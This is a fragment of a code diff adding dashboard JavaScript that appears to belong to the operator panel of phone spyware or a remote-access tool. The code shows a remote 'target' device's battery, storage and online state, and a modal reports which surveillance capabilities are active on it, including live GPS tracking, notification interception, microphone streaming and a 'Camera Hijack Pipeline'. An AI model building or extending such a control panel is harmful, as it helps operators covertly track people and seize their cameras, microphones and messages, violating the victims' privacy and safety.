+                document.getElementById('ui-battery-val').innerText = `${dev.battery_level || 0}%`;
+                const batIcon = document.getElementById('ui-battery-icon');
+                if (dev.is_charging) {
+                    document.getElementById('ui-battery-state').innerText = "Charging";
+                    document.getElementById('ui-battery-box').style.borderLeftColor = "#2ecc71";
+                    batIcon.setAttribute('data-lucide', 'battery-charging');
+                } else {
+                    document.getElementById('ui-battery-state').innerText = "Discharging";
+                    document.getElementById('ui-battery-box').style.borderLeftColor = "#e67e22";
+                    batIcon.setAttribute('data-lucide', 'battery');
+                }
+                lucide.createIcons();
+
+                // Vital 3: Storage
+                document.getElementById('ui-storage-val').innerText = dev.storage_used || 'N/A';
+
+                // Orb System Logic
+                const orb = document.getElementById('ui-health-orb');
+                const orbText = document.getElementById('ui-health-text');
+                
+                if (dev.online_status) {
+                    orb.className = 'orb orb-green';
+                    orbText.innerText = "SYSTEM OPTIMAL";
+                    orbText.style.color = "#2ecc71";
+                } else {
+                    this.setOfflineState();
+                }
+            }
+
+            setOfflineState() {
+                const orb = document.getElementById('ui-health-orb');
+                const orbText = document.getElementById('ui-health-text');
+                orb.className = 'orb orb-red';
+                orbText.innerText = "LINK SEVERED";
+                orbText.style.color = "#e74c3c";
             }
         }
+
+        // Initialize Engine
+        document.addEventListener('DOMContentLoaded', () => { new DashboardEngine(); });
+
+        // =================================================================================
+        // DIAGNOSTICS MODAL LOGIC (Settings Check)
+        // =================================================================================
+        window.openSettingsModal = async () => {
+            const modal = document.getElementById('settings-modal');
+            const content = document.getElementById('diagnostics-content');
+            const deviceId = localStorage.getItem('active_device_id');
+            const token = localStorage.getItem('owner_token');
+
+            modal.style.display = 'flex';
+            content.innerHTML = '<p style="color: #aaa; text-align: center;">Scanning target security architecture...</p>';
+
+            if (!deviceId) return content.innerHTML = '<p style="color: #e74c3c;">Target context not locked.</p>';
+
+            try {
+                const res = await fetch(`/api/devices/diagnostics?device_id=${deviceId}`, {
+                    headers: { 'Authorization': `Bearer ${token}` }
+                });
+                const result = await res.json();
+
+                if (result.status === 'success' && result.data.length > 0) {
+                    const perms = result.data[0];
+                    const map = {
+                        'Accessibility Engine': perms.accessibility,
+                        'Live GPS Track': perms.location,
+                        'Notification Intercept': perms.notification_access,
+                        'Storage Write': perms.storage,
+                        'Mic & Audio Stream': perms.microphone,
+                        'Camera Hijack Pipeline': perms.camera
+                    };
+
+                    let html = '<div style="display:flex; flex-direction:column; gap:8px;">';
+                    for (const [key, val] of Object.entries(map)) {
+                        const color = val ? '#2ecc71' : '#e74c3c';
+                        html += `
+                            <div style="display:flex; justify-content:space-between; background:#242424; padding:10px 15px; border-radius:4px; border-left:3px solid ${color};">
+                                <span style="font-size:13px; color:#ddd; font-weight:600;">${key}</span>
+                                <span style="color:${color}; font-weight:bold;">${val ? 'ACTIVE' : 'BLOCKED'}</span>
+                            </div>
+                        `;
+                    }
+                    html += '</div>';
+                    content.innerHTML = html;
+                } else {
+                    content.innerHTML = '<p style="color:#f1c40f;">No remote payload data found.</p>';
+                }
+            } catch (e) {
+                content.innerHTML = '<p style="color:#e74c3c;">Execution blocked by host network.</p>';
+            }
+        };
+
+        window.closeSettingsModal = () => { document.getElementById('settings-modal').style.display = 'none'; };
     </script>
-    <script src="/static/js/dashboard.js"></script>
 </body>
 </html>
